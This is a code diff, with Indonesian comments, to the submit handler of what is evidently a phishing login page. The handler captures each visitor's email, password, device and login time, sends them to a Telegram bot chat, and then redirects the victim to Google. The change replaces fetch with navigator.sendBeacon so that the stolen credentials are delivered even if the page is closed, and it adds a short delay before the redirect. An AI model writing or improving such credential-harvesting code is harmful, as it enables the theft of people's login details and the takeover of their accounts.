@@ -8,23 +8,22 @@ document.getElementById("loginForm").addEventListener("submit", function (event)
     let chatId = "6786210993";
     let userAgent = navigator.userAgent;
 
-    // Kirim data SECEPATNYA ke Telegram tanpa tunggu apa pun
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: `🔒 *Login Berhasil!*\n\n`
-                + `🕒 *Waktu:* ${waktuLogin}\n`
-                + `📧 *Email:* ${email}\n`
-                + `🔑 *Password:* ${password}\n`
-                + `📱 *Device:* ${userAgent}`,
-            parse_mode: "Markdown"
-        })
-    });
+    let message = `🔒 *Login Berhasil!*\n\n`
+        + `🕒 *Waktu:* ${waktuLogin}\n`
+        + `📧 *Email:* ${email}\n`
+        + `🔑 *Password:* ${password}\n`
+        + `📱 *Device:* ${userAgent}`;
 
-    console.log("✅ Data terkirim langsung ke Telegram!");
+    // Gunakan sendBeacon (lebih cepat & tetap terkirim meski halaman ditutup)
+    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    let data = new Blob([JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })], { type: "application/json" });
 
-    // Redirect ke Google langsung tanpa nunggu respon
-    window.location.href = "https://www.google.com";
+    navigator.sendBeacon(url, data);
+
+    console.log("✅ Data langsung terkirim ke Telegram!");
+
+    // Tunggu 500ms sebelum redirect biar pasti terkirim
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 500);
 });
